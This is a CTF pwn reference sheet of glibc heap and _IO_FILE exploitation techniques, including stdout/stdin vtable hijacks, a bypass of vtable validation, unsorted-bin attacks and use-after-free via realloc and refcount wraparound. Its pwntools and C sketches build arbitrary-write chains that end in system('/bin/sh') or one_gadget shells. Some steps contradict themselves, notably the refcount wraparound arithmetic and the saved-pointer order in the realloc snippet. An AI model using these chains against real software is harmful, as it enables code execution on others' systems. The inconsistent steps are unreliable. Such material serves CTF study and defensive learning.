# CTF Pwn - Heap FILE Structure Attacks

FILE-structure (_IO_FILE) exploitation for libc 2.23-2.27+: fastbin→stdout vtable hijack, _IO_buf_base null byte overwrites, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on FILE fields, and menu-driven UAF / refcount bugs that land through these FILE primitives. For classical heap attacks (House of *, unlink, tcache, musl), see [heap-techniques.md](heap-techniques.md).

## Table of Contents
- [Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
- [_IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)](#_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017)
- [glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
- [Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
- [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
- [realloc(ptr, 0) as free() for UAF (AceBear 2018)](#reallocptr-0-as-free-for-uaf-acebear-2018)
- [Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)](#single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018)

---

## Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)

**Pattern:** When PIE and Full RELRO block GOT overwrite, target libc's stdout FILE structure via fastbin attack, using a two-stage vtable hijack.

```python
from pwn import *

# Stage 1: Fastbin double-free targeting fake chunk inside stdout
# Use 0x7f byte in libc stdout region as fake chunk size (matches 0x70 fastbin)
fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte

# Double-free in 0x70 fastbin
alloc_a = malloc(0x60)
alloc_b = malloc(0x60)
free(alloc_a)
free(alloc_b)
free(alloc_a)  # double-free: fastbin 0x70 = [a -> b -> a]

# Redirect fastbin to stdout region
malloc(0x60, p64(fake_chunk_addr))  # a's fd -> fake chunk in stdout
malloc(0x60)                         # returns b
malloc(0x60)                         # returns a again

# Stage 2a: First vtable overwrite → gets()
# rdi points to stdout struct, so gets(stdout) reads input into stdout
fake_stdout_chunk = malloc(0x60)     # returns fake chunk overlapping stdout
write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets

# Stage 2b: gets() overwrites stdout vtable again → system()
# Next puts() call triggers: vtable lookup → gets(stdout)
# gets() reads from stdin into the stdout struct, overwriting vtable again
# Input: "1\x80;/bin/sh;" — new vtable points to system()
# After gets() returns, next output call triggers system()
```

**Key insight:** The 0x7f byte naturally present in libc's stdout region satisfies fastbin size validation for the 0x70 bin. Two-stage hijack: first redirect vtable to `gets()` (since rdi=stdout FILE*), then `gets()` reads a second vtable pointing to `system()` along with the command string. This technique works even with PIE + Full RELRO because it targets libc's writable data segment, not the GOT.

**When to recognize:** Challenge has PIE + Full RELRO, with a heap UAF or double-free. The 0x7f byte in libc's FILE structures is a universal fastbin target. Check `_IO_2_1_stdout_` region for 0x7f bytes at aligned offsets suitable as fake chunk sizes.

**References:** ASIS CTF 2017

---

## _IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)

**Pattern:** A null-byte (off-by-one) heap overflow corrupts the least significant byte of `_IO_buf_base` in stdin's `_IO_FILE` structure. This redirects the stdin input buffer pointer to `_short_buf` — a small internal buffer that lies within the FILE struct itself. Subsequent `scanf`/`fgets` calls then write attacker input directly into the FILE structure, enabling overwrite of `_IO_buf_base`/`_IO_buf_end` to arbitrary addresses for a full write primitive.

**How it works:**
```c
// Null byte overwrite targets _IO_buf_base's LSB
// Before: _IO_buf_base = 0x7f...XX00  (points to heap input buffer)
// After:  _IO_buf_base = 0x7f...0000  (points into FILE struct itself,
//                                       landing near _short_buf)
// Next scanf() / fgets() reads input into the FILE struct
// Overwrite _IO_buf_base/_IO_buf_end fields with arbitrary addresses
// Now stdin reads from attacker-controlled memory address
```

**Exploitation chain:**
```python
# 1. Arrange heap: allocation immediately before stdin's _IO_buf_base
#    (requires heap grooming so chunk is adjacent to FILE struct)

# 2. Null-byte overflow: write one 0x00 byte past chunk boundary
#    → corrupts _IO_buf_base LSB → points into FILE struct

# 3. Next read (scanf/fgets): input written into FILE struct fields
#    → overwrite _IO_buf_base = target_addr, _IO_buf_end = target_addr + size

# 4. Next read: stdin reads from target_addr → arbitrary write primitive
#    → overwrite __free_hook with system() or one_gadget

# 5. Trigger: call a function that invokes free() with a controlled pointer
#    → system("/bin/sh")
```

**Key insight:** Null-byte overflow into stdin's `_IO_buf_base` relocates the input buffer into the FILE structure itself, providing arbitrary write via standard I/O functions. The `_short_buf` field within the FILE struct is the natural landing target when the LSB is zeroed.

**References:** Tokyo Westerns CTF 2017

---

## glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)

**Pattern:** glibc 2.24+ validates vtable pointers against the `_IO_vtables` section, rejecting pointers outside that range. Bypass: use unchecked sub-function entries reachable via two-hop dereference. Arrange two heap pointers 0x10 bytes apart (via unsorted bin fd/bk). The first pointer is set to `valid_vtable_addr - 0x18`; the second to `system()`. `_IO_flush_all_lockp` dereferences `*(addr + 0xd8) + 0x18`, landing in an unchecked sub-function that calls `*(addr + 0xe8)`.

**How the two-hop bypass works:**
```c
// _IO_flush_all_lockp calls:
//   fp->vtable->_IO_overflow(fp)
// With a valid vtable addr but offset trick:
//   vtable[offset] → points to sub-function outside vtable validation
//   sub-function dereferences further → calls system()

// Heap layout using unsorted bin fd/bk (0x10 apart):
//   [heap + 0x00]: valid_vtable_addr - 0x18   (passes vtable check at offset 0xd8)
//   [heap + 0x10]: system()                   (called via *(addr + 0xe8) dereference)
```

**Setup:**
```python
# Place two pointers 0x10 apart using unsorted bin fd/bk as write targets
# unsorted bin attack: write main_arena+88 to target, leak heap/libc
# Craft FILE struct with _flags = " sh\x00" for system() argument
# Trigger exit() → _IO_flush_all_lockp → two-hop call → system("sh")
```

**Key insight:** Vtable validation checks the address range but not indirect entries reachable via sub-functions — two-hop call chains bypass `__IO_vtable_check`. The fd/bk pointers of a chunk in the unsorted bin sit exactly 0x10 bytes apart, making them natural targets for the two adjacent pointer slots needed.

**References:** HITCON CTF 2017

---

## Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)

**Pattern:** An off-by-one NULL byte creates overlapping heap chunks. Free into the unsorted bin, then use the unsorted bin attack (corrupting `bk` of an unsorted bin chunk) to overwrite `_IO_buf_end` of stdin's FILE structure with a large libc address (main_arena+88). The next `scanf` call then reads attacker data into libc's stdin buffer region — enabling overwrite of `__malloc_hook` with a one_gadget.

**Exploit chain:**
```python
# 1. Off-by-one NULL: corrupt next chunk's PREV_INUSE, set prev_size
#    → create overlapping chunks via heap consolidation

# 2. Free victim into unsorted bin
#    → victim->fd = main_arena+88, victim->bk = main_arena+96

# 3. Unsorted bin attack: set victim->bk = &stdin._IO_buf_end - 0x10
#    When malloc() removes victim from unsorted bin:
#    → victim->bk->fd = victim   (writes heap address → _IO_buf_end)
#    But for full attack: set bk = &target - 0x10 to write main_arena+88 there

# 4. stdin._IO_buf_end is now a large value → next scanf reads huge input
#    → attacker data written into libc stdin buffer region
#    → __malloc_hook in that region gets overwritten with one_gadget

# 5. Trigger: any malloc() call → __malloc_hook → one_gadget → shell
```

**Key insight:** Unsorted bin attack on `_IO_buf_end` causes `scanf` to read from an attacker-controlled buffer region inside libc's data segment. Since `__malloc_hook` resides near the stdin buffer in libc, a single large read can overwrite it with a one_gadget address.

**References:** HITCON CTF 2017

---

## Unsorted Bin Corruption via mp_ Structure (HITCON 2017)

**Pattern:** glibc's `mp_` (`malloc_par`) global structure lies near the unsorted bin in libc's data segment. A heap overflow combined with unsorted bin corruption overwrites `mp_->bk` with an address inside `mp_`. The `mp_` structure contains fields that, when interpreted as a free chunk header, pass unsorted bin validation (`size < system_mem`). Allocating from this "chunk" grants write access inside `mp_`, enabling overwrite of `__malloc_hook`. Requires partial ASLR brute-force (1/16 chance) for the heap address alignment.

**Why mp_ works:**
```c
// mp_ layout (glibc 2.23, near unsorted bin in libc BSS):
// struct malloc_par {
//   unsigned long  trim_threshold;   // offset 0x00 — large value, passes size check
//   unsigned long  top_pad;          // offset 0x08
//   ...
//   unsigned long  system_mem;       // offset 0x48 — must be > fake chunk size
// };
// mp_.trim_threshold interpreted as chunk size → satisfies unsorted bin checks
// malloc from mp_-as-chunk returns memory overlapping mp_ fields
// Write __malloc_hook offset within mp_ → control next malloc → one_gadget
```

**Exploitation:**
```python
# Heap overflow: corrupt unsorted bin chunk's bk to point into mp_
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # offset where size field looks valid

# Trigger unsorted bin traversal: malloc() of appropriate size
# → unsorted bin unlinks fake chunk at mp_
# → returns pointer into mp_ data
# Write one_gadget to __malloc_hook offset within returned chunk
malloc(size)  # returns mp_+0x10
write_to_result(one_gadget)  # overwrites __malloc_hook

# Trigger: next malloc() → __malloc_hook → one_gadget → shell
```

**Key insight:** glibc's `mp_` global structure passes unsorted bin validation naturally — its `trim_threshold` field serves as a convincing fake chunk size. A fake free chunk planted via unsorted bin corruption there enables allocation directly into glibc metadata, bypassing the need for any heap-side fake chunk construction.

**References:** HITCON CTF 2017

---

## realloc(ptr, 0) as free() for UAF (AceBear 2018)

**Pattern:** `realloc(ptr, 0)` behaves like `free(ptr)` in many glibc versions, returning the chunk to the freelist while the application may retain the old pointer — creating a use-after-free.

**How it works:**
```c
// C standard says realloc(ptr, 0) is implementation-defined
// In glibc: realloc(ptr, 0) calls free(ptr) and returns NULL
// If the application doesn't check the return value:
void *ptr = malloc(0x80);
ptr = realloc(ptr, 0);    // ptr is now NULL, chunk is freed
// But if the app stores the old pointer separately:
void *saved = ptr;
ptr = realloc(ptr, 0);    // freed, but saved still points to freed chunk
// saved is now a dangling pointer → UAF
```

**Exploitation:**
```python
from pwn import *

# Step 1: Allocate a chunk
add(0, 0x80, b"AAAA")  # chunk at index 0

# Step 2: Trigger realloc with size 0
# Internally calls realloc(ptr, 0) which frees the chunk
edit(0, size=0)  # realloc(ptr, 0) = free(ptr)
# ptr is now freed but the application still holds the pointer at index 0

# Step 3: Allocate new chunk that reuses the freed memory
add(1, 0x80, b"BBBB")  # gets the same address as freed chunk

# Step 4: Read through original index 0 → reads attacker-controlled data from index 1
# Or: write through index 0 to corrupt index 1's chunk
view(0)  # UAF read — sees "BBBB" written by index 1
```

**Tcache variant (glibc 2.26+):**
```python
# realloc(ptr, 0) puts the chunk in the tcache bin
# Subsequent malloc of the same size returns the same chunk
# Double reference enables tcache poisoning:

add(0, 0x80, b"AAAA")
edit(0, size=0)           # free via realloc → tcache[0x90]
add(1, 0x80, p64(target)) # reuse freed chunk, write fake fd pointer
# If index 0 still references the chunk:
edit(0, size=0)           # double-free via realloc → tcache poisoning
add(2, 0x80, b"CCCC")    # returns freed chunk
add(3, 0x80, payload)    # returns target address → arbitrary write
```

**Key insight:** `realloc(ptr, 0)` is implementation-defined. In glibc, it frees the block and returns NULL. If the application doesn't check the return value or still uses the old pointer, this creates a UAF. Look for `realloc` calls where the size parameter is user-controlled — setting it to 0 triggers the free behavior without going through the application's normal delete/free path, potentially bypassing reference counting or pointer nullification in the delete handler.

**When to recognize:** Challenge uses `realloc` for resize operations and the size is user-controlled. The "edit" or "resize" functionality internally calls `realloc` — check if size=0 is handled specially or just passed through. Also check if the return value of `realloc` is used to update the stored pointer (if not, the old pointer becomes dangling).

**References:** AceBear 2018

---

## Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)

**Pattern:** A struct stores its own reference count in a `uint8_t` field. The object is freed only when `refcount == 0`, but because the counter wraps at 256, calling the `addref()` path 256 times brings `refcount` back to zero while every outstanding handle still holds a live pointer. The next call to `release()` frees the object — all other handles become dangling.

**Exploit sketch:**
```c
struct Book {
    uint8_t refcount;     // 1 byte — vulnerable
    char title[32];
    void (*read)(struct Book*);
};

// 1. create(h0)                    refcount = 1
// 2. dup(h0) → h1 ... h256         refcount wraps 1 → 2 → ... → 0
// 3. release(h1)                   refcount = 255 (underflow) → object freed
// 4. Heap reallocation fills the same chunk with attacker data
// 5. read(h0)                      calls attacker-controlled vtable pointer
```

**Key insight:** Any counter that guards lifetime must be wide enough to exceed the number of handles the program can create in one session. `uint8_t` refcounts are always a red flag — verify that the `addref` path either saturates (stays at 255) or uses a wider type. The exploit only needs 256 `addref` calls and one extra `release`, so even heavily rate-limited handle APIs remain reachable.

**References:** WhiteHat Grand Prix 2018 — writeup 10809
